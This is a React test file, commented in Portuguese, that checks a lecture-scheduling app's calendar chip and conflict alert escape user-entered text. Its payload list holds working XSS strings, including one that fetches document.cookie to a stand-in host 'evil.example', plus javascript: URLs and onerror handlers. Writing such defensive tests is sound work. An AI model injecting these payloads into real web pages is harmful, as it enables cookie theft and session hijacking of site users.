import { describe, expect, it } from "vitest";
import { render, screen } from "@testing-library/react";
import type { Lecture } from "@/modules/lecture/lecture.types";
import { LectureChip } from "./calendar/lecture-chip";
import { LectureConflictAlert } from "./lecture-conflict-alert";

/**
 * XSS: A DEFESA É A ESCAPAGEM NA SAÍDA (§51).
 *
 * O texto malicioso ENTRA e é GRAVADO intacto — isso está certo, e a bateria SQL
 * (casos K01–K06) prova que ele volta do banco byte a byte. Sanitizar na entrada
 * destruiria "a < b" numa observação legítima e não protegeria o dia em que o
 * mesmo campo for lido por um canal que não escapa.
 *
 * O que protege é isto: React trata todo texto interpolado como TEXTO. Estes
 * testes montam os componentes com payload de verdade e conferem que:
 *
 *   • nenhum `<script>` ou `<img>` nasce no DOM;
 *   • o texto aparece na tela exatamente como foi digitado.
 *
 * ⚠️ Se alguém um dia trocar `{lecture.name}` por `dangerouslySetInnerHTML`,
 * estes testes quebram — que é o único momento em que isso pode ser pego antes
 * de ir para produção.
 */

const PAYLOADS = [
  "<script>alert(1)</script>",
  '<img src=x onerror="alert(document.cookie)">',
  "<svg/onload=alert(2)>",
  "<iframe src=\"javascript:alert('xss')\"></iframe>",
  "<a href=\"javascript:alert('x')\">clique</a>",
  "\"><script>fetch('//evil.example/'+document.cookie)</script>",
];

function palestra(overrides: Partial<Lecture>): Lecture {
  return {
    id: "11111111-1111-4111-8111-111111111111",
    protocol: "SOL-000001",
    origin: "chatbot",
    name: "Manejo sanitário",
    theme: "Prevenção",
    city: "Toledo",
    location: null,
    type: "company",
    typeOther: null,
    format: "in_person",
    eventDate: "2026-09-20",
    startTime: "09:00",
    endTime: "10:00",
    attendeesEstimated: null,
    attendeesActual: null,
    speaker: null,
    responsible: null,
    priority: "normal",
    status: "planned",
    notes: null,
    rejectionReason: null,
    cancellationReason: null,
    requestedAt: "2026-08-13T12:00:00Z",
    heldAt: null,
    outcomeNotes: null,
    requester: { contactId: null, name: null, email: null, phone: null, organization: null },
    createdBy: null,
    createdAt: "2026-08-13T12:00:00Z",
    updatedBy: null,
    updatedAt: "2026-08-13T12:00:00Z",
    ...overrides,
  };
}

describe("payload no calendário", () => {
  for (const payload of PAYLOADS) {
    it(`não executa: ${payload.slice(0, 30)}`, () => {
      const { container } = render(
        <LectureChip
          lecture={palestra({ name: payload, city: payload })}
          draggable={false}
          onDragStart={() => {}}
          onDragEnd={() => {}}
          dragging={false}
        />,
      );

      expect(container.querySelector("script")).toBeNull();
      expect(container.querySelector("img")).toBeNull();
      expect(container.querySelector("iframe")).toBeNull();
      expect(container.querySelector("svg")).toBeNull();

      // E o texto continua lá, inteiro — quem cadastrou vê o que digitou.
      expect(container.textContent).toContain(payload);
    });
  }

  it("o title do link também é texto, não markup", () => {
    const payload = '<img src=x onerror="alert(1)">';
    const { container } = render(
      <LectureChip
        lecture={palestra({ name: payload })}
        draggable={false}
        onDragStart={() => {}}
        onDragEnd={() => {}}
        dragging={false}
      />,
    );

    const link = container.querySelector("a");
    expect(link?.getAttribute("title")).toContain(payload);
    expect(container.querySelector("img")).toBeNull();
  });
});

describe("payload no alerta de conflito", () => {
  for (const payload of PAYLOADS) {
    it(`não executa: ${payload.slice(0, 30)}`, () => {
      const { container } = render(
        <LectureConflictAlert
          conflicts={[
            {
              id: "22222222-2222-4222-8222-222222222222",
              protocol: "SOL-000002",
              name: payload,
              eventDate: "2026-09-20",
              startTime: "10:00",
              endTime: "11:00",
              city: payload,
              responsibleName: payload,
              speakerName: null,
            },
          ]}
        />,
      );

      expect(container.querySelector("script")).toBeNull();
      expect(container.querySelector("img")).toBeNull();
      expect(container.querySelector("iframe")).toBeNull();
      expect(container.textContent).toContain(payload);
    });
  }
});

/**
 * O caso mais perigoso da lista: `javascript:` num href. React 19 já bloqueia e
 * avisa, mas nenhum campo desta tela vira href — o único link é montado por
 * `lectureHref(id)`, e o id é uuid validado. Este teste existe para que a
 * afirmação continue verdadeira depois de qualquer refatoração.
 */
describe("nenhum campo do usuário vira endereço", () => {
  it("o href do chip é sempre a rota da palestra", () => {
    const { container } = render(
      <LectureChip
        lecture={palestra({ name: "javascript:alert(1)", city: "javascript:alert(2)" })}
        draggable={false}
        onDragStart={() => {}}
        onDragEnd={() => {}}
        dragging={false}
      />,
    );

    const href = container.querySelector("a")?.getAttribute("href");
    expect(href).toBe("/lectures/11111111-1111-4111-8111-111111111111");
  });

  it("nenhum href com esquema javascript: em lugar nenhum", () => {
    render(
      <LectureConflictAlert
        conflicts={[
          {
            id: "22222222-2222-4222-8222-222222222222",
            protocol: "javascript:alert(1)",
            name: "javascript:alert(2)",
            eventDate: "2026-09-20",
            startTime: null,
            endTime: null,
            city: "javascript:alert(3)",
            responsibleName: null,
            speakerName: null,
          },
        ]}
      />,
    );

    for (const link of screen.queryAllByRole("link")) {
      expect(link.getAttribute("href")?.toLowerCase()).not.toContain("javascript:");
    }
  });
});
